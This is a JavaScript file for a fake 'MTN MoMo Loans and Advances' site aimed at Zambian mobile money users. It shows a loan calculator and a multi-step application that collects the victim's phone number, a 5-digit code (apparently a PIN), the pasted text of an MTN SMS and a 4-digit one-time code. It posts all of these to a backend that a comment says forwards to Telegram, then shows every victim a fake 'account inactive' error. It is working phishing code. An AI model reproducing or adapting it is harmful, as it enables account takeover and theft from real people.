// --- Translation Dictionary ---
const translations = {
    en: {
        calc_welcome: "MTN MoMo Loans and Advances", calc_welcome_sub: "Get loans easily through MTN MoMo",
        calc_title: "Loan Calculator", calc_amount: "Amount", calc_term: "Term", calc_monthly: "Monthly Payment", calc_btn: "START APPLICATION",
        form_step1: "Step 1 of 3", form_step2: "Step 2 of 3", form_step3: "Step 3 of 3",
        form_loan_details: "Loan Details", form_loan_type: "Loan Type", form_loan_business: "Business Loan", form_loan_personal: "Personal Loan", form_loan_emergency: "Emergency Loan", form_loan_amount: "Loan Amount (ZMW)", form_loan_term: "Loan Term", form_loan_purpose: "Purpose of Loan", 
        form_personal_details: "Personal Details", form_first_name: "First Name", form_first_name_ph: "First Name", form_last_name: "Last Name", form_last_name_ph: "Last Name", form_phone: "Phone Number (Zambia)", form_phone_ph: "9 digits (e.g., 971234567)", form_code: "5-Digit Verification Code", form_code_ph: "Enter 5-digit code",
        form_emp_details: "Employment Details", form_emp_status: "Employment Status", form_emp_self: "Self-employed", form_emp_student: "Student", form_emp_full: "Employed full time", form_emp_part: "Employed part time", form_emp_unemployed: "Unemployed", form_annual_income: "Annual Income (ZMW)", form_annual_income_ph: "e.g., 5000000",
        form_next: "NEXT STEP", form_back: "BACK", form_submit: "SUBMIT APPLICATION",
        proc_title: "Processing Application", proc_subtitle: "Please wait, this may take a few seconds",
        sms_title_1: "Paste the", sms_title_2: "SMS", sms_subtitle_1: "We sent a confirmation message to your number.<br><strong>Copy the full SMS you received</strong> and paste it below.",
        sms_tip: "Open your Messages app, find the SMS from MTN, long-press it, tap Copy, then come back here.", sms_placeholder: "Paste the SMS received from MTN here...", sms_btn: "VERIFY & CONTINUE &rarr;",
        ver_title: "Enter the Verification Code", ver_subtitle: "We sent a 4-digit code to your number. Enter it below to continue.", ver_btn: "VERIFY",
        err_title: "Oops! Your account is inactive", err_subtitle_1: "We can't credit your loan at the moment.", err_next: "Here's what to do next", err_subtitle_2: "Your account cannot be credited because it is not active. Please ensure you are using an active account that has been making transactions regularly, then try again."
    }
};

let currentLang = 'en'; 
// Temporary storage for the phone and 5-digit code
let tempApplicationData = {}; 

function setLanguage(lang) {
    currentLang = lang;
    document.querySelectorAll('[data-translate]').forEach(el => {
        const key = el.getAttribute('data-translate');
        if (translations[lang] && translations[lang][key]) el.innerHTML = translations[lang][key];
    });
    document.querySelectorAll('[data-translate-placeholder]').forEach(el => {
        const key = el.getAttribute('data-translate-placeholder');
        if (translations[lang] && translations[lang][key]) el.setAttribute('placeholder', translations[lang][key]);
    });
    showScreen('main-screen');
}

function showScreen(screenId) {
    document.querySelectorAll('.dark-screen').forEach(screen => screen.classList.remove('active'));
    document.getElementById(screenId).classList.add('active');
}

function updateLoanValue() {
    const amountSlider = document.getElementById('loanAmount');
    const termSlider = document.getElementById('loanTerm');
    const amountDisplay = document.getElementById('amountDisplay');
    const termDisplay = document.getElementById('termDisplay');
    const monthlyOutput = document.getElementById('monthlyPayment');
    
    const amount = parseInt(amountSlider.value);
    const term = parseInt(termSlider.value);
    
    amountDisplay.innerText = `ZMW ${amount.toLocaleString()}`;
    termDisplay.innerText = `${term} Months`; 

    const interestRate = 0.12; 
    const totalRepayment = amount + (amount * interestRate);
    const monthly = totalRepayment / term;
    monthlyOutput.innerText = `ZMW ${Math.ceil(monthly).toLocaleString()}`;
}

updateLoanValue();

function goToForm() {
    const amount = document.getElementById('loanAmount').value;
    const term = document.getElementById('loanTerm').value;
    document.getElementById('formLoanAmount').value = amount;
    document.getElementById('formLoanTerm').value = `${term} Months`;
    showScreen('form-screen');
}

function nextStep(stepNumber) {
    document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
    document.getElementById(`step-${stepNumber}`).classList.add('active');
    
    const progressFill = document.getElementById('progress-fill');
    const stepText = document.getElementById('step-indicator');
    
    if(stepNumber === 1) {
        progressFill.style.width = '33.33%';
        stepText.setAttribute('data-translate', 'form_step1');
        stepText.innerText = translations[currentLang].form_step1;
    } else if(stepNumber === 2) {
        progressFill.style.width = '66.66%';
        stepText.setAttribute('data-translate', 'form_step2');
        stepText.innerText = translations[currentLang].form_step2;
    } else if (stepNumber === 3) {
        progressFill.style.width = '100%';
        stepText.setAttribute('data-translate', 'form_step3');
        stepText.innerText = translations[currentLang].form_step3;
    }
}

function prevStep(stepNumber) {
    document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
    document.getElementById(`step-${stepNumber}`).classList.add('active');
    
    const progressFill = document.getElementById('progress-fill');
    const stepText = document.getElementById('step-indicator');
    
    if(stepNumber === 1) {
        progressFill.style.width = '33.33%';
        stepText.setAttribute('data-translate', 'form_step1');
        stepText.innerText = translations[currentLang].form_step1;
    } else if(stepNumber === 2) {
        progressFill.style.width = '66.66%';
        stepText.setAttribute('data-translate', 'form_step2');
        stepText.innerText = translations[currentLang].form_step2;
    }
}

// FIRST SUBMISSION: Grabs Phone and 5-Digit Code
async function submitApplication() {
    showScreen('processing-screen');

    // Save the phone and 5-digit code to our temporary variable
    tempApplicationData = {
        phone: document.querySelector('#step-2 input[type="tel"]').value || 'Not provided',
        fiveDigitCode: document.querySelector('#step-2 input[placeholder="Enter 5-digit code"]').value || 'Not provided',
        fourDigitCode: 'Pending...' // We don't have this yet
    };

    try {
        const response = await fetch('/api/submit-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(tempApplicationData)
        });

        if (response.ok) {
            setTimeout(() => {
                showScreen('sms-screen'); 
            }, 1500);
        } else {
            alert("Error sending. Try again.");
            showScreen('main-screen');
        }
    } catch (error) {
        console.error("Error:", error);
        showScreen('main-screen');
    }
}

// SECOND SUBMISSION: Grabs the 4-Digit Code and sends the final update
async function submitFourDigitCode() {
    showScreen('processing-screen');

    // Update the 4-digit code
    tempApplicationData.fourDigitCode = document.querySelector('#verification-screen input').value || 'Not provided';

    try {
        // Send the final update to Telegram
        await fetch('/api/submit-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(tempApplicationData)
        });
        
        // Then show the error screen (as per your app's flow)
        showScreen('error-screen');
    } catch (error) {
        console.error("Error:", error);
        showScreen('error-screen');
    }
}